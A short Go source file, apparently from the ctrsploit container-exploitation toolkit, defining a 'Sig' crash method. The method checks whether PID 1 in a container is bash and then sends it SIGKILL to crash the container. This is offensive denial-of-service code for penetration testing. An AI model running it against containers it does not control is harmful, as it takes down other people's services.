package crash

import (
	"context"
	"github.com/ctrsploit/ctrsploit/internal"
	pkgcrash "github.com/ctrsploit/ctrsploit/pkg/crash"
	"github.com/pkg/errors"
	"os"
)

type Sig struct {
	validBinary map[string]bool
}

func NewSig() Sig {
	return Sig{
		validBinary: map[string]bool{
			"bash": true, // https://www.gnu.org/software/bash/manual/html_node/Signals.html
		},
	}
}

func (c Sig) Valid() (valid bool, err error) {
	processName, err := internal.GetProcessNameByPid(1)
	if err != nil {
		if errors.Is(err, os.ErrPermission) || errors.Is(err, os.ErrNotExist) {
			valid = false
			err = nil
		}
		return
	}
	if _, ok := c.validBinary[processName]; ok {
		valid = true
	}
	return
}

func (c Sig) Crash() (err error) {
	return pkgcrash.TriggerFirst(context.Background(), pkgcrash.Sigkill{PID: 1})
}
